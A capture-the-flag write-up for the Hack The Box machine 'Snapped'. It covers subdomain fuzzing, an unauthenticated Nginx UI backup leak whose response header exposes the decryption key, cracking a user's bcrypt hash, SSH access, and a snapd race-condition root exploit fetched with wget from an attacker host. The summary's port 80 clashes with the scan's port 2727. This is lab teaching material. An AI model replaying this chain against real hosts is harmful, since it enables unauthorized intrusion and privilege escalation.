# Snapped HTB - Writeup

---

## Summary

Snapped is a Hack The Box machine that requires exploiting a vulnerability in the **Nginx UI** application and performing local privilege escalation via **CVE-2026-3888** (`snapd` LPE). The attack chain leads to root access.

---

## Reconnaissance

### Port Scanning

```bash
nmap -sC -sV -p- <T001010-00-0001>
```

**Results:**
``bash
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3.13ubuntu3.13.6
2727/tcp  open  http    nginx 1.24.0 (Ubuntu)
```

---

## Web - Subdomain `admin.snapped.htb`

### Subdomain Enumeration

```bash
ffuf -u http://snapped.htb/ -H "Host: FUZ.snapped.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 20199
```

**Result:** `admin.snapped.htb`

### Hosts File Entry

```bash
echo "<T001010-00-0001> admin.snapped.htb" >> /etc/hosts
```

---

## Nginx UI - Backup Vulnerability (CVE-2026-27944)

### Downloading Backup Without Authentication

```bash
curl -i http://admin.snapped.htb/api/backup -o backup.zip
```

**Header `X-Backup-Security`**: `qMYHqZul+TQ6NZd2YH/yuTfMzDf6lhrXucBjoN8cxdk=:knZ2mPoL1Yv/yGnM5wV5CA==`

### Decrypting the Backup (Python)

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

key = base64.b64decode("qMYHqZul+TQ6NZd2YH/yuTfMzDf6lhrXucBjoN8cxdk=")
iv = base64.b64decode("knZ2mPoL1Yv/yGnM5wV5CA==")

with open("backup.zip", "rb") as f:
    encrypted = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)

with open("backup_decrypted.zip", "wb") as f:
    f.write(decrypted)
```

### Extraction

```bash
unzip backup_decrypted.zip -d backup_extracted/
```

---

## Backup Analysis

### `app.ini` - Keys and Credentials

```ini
[app]
JwtSecret = 6c4af436-035a-4942-9ca6-172b36696ce9

[crypto]
Secret = 5c942292647d73f597f47c0be2237bf7347cdb70a0e8e8558e4483188623576f

[node]
Secret = c64d7ca1-19cb-4ebe-96d4-49037e7df78e

[database]
Path = /var/lib/nginx-ui/database.db
```

### SQLite Database

```bash
sqlite3 database.db
```

**`users` table:**
```
id | name      | password
1  | admin     | $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTRIVItEvm
2  | jonathan  | $2a$10$8M7JZSRILkdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

### Cracking `jonathan`'s Password

```bash
echo '$2a$10$8M7JZSRILkdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq' > jonathan.hash
hashcat -m 3200 jonathan.hash /usr/share/wordlists/rockyou.txt
```

**Password:** `linkinpark`

---

## Access via SSH

```bash
ssh jonathan@<TARGET_IP>
```

**Password:** `linkinpark`

---

## Local Privilege Escalation - CVE-2026-3888

### Verifying `snapd` Version

```bash
snap --version
```

**Output:**
```
snap    2.63.1+24.04
snapd   2.63.1+24.04
```

**Vulnerable** - requires `< 2.74.2`.

### Downloading the Exploit

```bash
wget http://<ATTACKER_IP>:8000/exploit_suid.c
wget http://<ATTACKER_IP>:8000/librootshell_suid.c
```

### Compilation on Attacker Machine

```bash
gcc -O2 -static -o exploit exploit_suid.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
```

### Transfer to Target Machine

```bash
python3 -m http.server 8000
wget http://<ATTACKER_IP>:8000/exploit
wget http://<ATTACKER_IP>:8000/librootshell.so
chmod +x exploit
```

### Running the Exploit

```bash
./exploit ./librootshell.so -d
```

**Output:**
```
item1 1 --- create writable-mimic over "/usr/lib/x86_64-linux-gnu": permission denied

[!]   TRIGGER — swapping directories...
[+]   SWAP DOM — race won!
[+p]   Payload injected.

[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)

==============================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
==============================================================================
```

---

## Root Access

```bash
bash-5.1# cat /root/root.txt
b7af4d7e2905f9e5f6b68f3b9dc1edc8
```

---

## Attack Chain Summary

| Step | Description |
|-----|---------------------------------------------------------------------------|
| 1 | Port scan → port 80 → `snapped.htb` |
| 2 | Subdomain fuzzing ‒ `admin.snapped.htb` |
| 3 | CVE-2026-27944 → backup .zip with encryption keys |
| 4 | Decrypt backup → `app.ini`, SQLite database |
| 5 | Crack `jonathan:linkinpark` |
| 6 | SSH access as `jonathan` |
| 7 | Local privlege escalation via CVE-2026-3888 → root |
| 8 | Read flag `/root/root.txt` |

---

## Tools Used

- `nmap`
- `ffuf`
- `curl`
- `python3`` + `pycryptodome`
- `sqlite3`
- `hashcat`
- `gcc`
- `exploit_suid.c` / `librootshell_suid.c`

---

## Vulnerabilities

| CVE | Description |
|------|---------------------------------------------------------------------------|
| **CVE-2026-27944** | Unauthenticated backup download with AES key disclosure in Nginx UI |
| **CVE-2026-3888** | Local privilege escalation via `snapd` (TOCTOU race condition) |

---

## Key Takeaways

1. Nginx UI version 2.3.2 is vulnerable to backup exposure.
2. Weak passwords in the database (`linkinpark`).
3. `snapd` version 2.63.1 is vulnerable to CVE-2026-3888.
4. A standard user can escalate to root using this exploit.
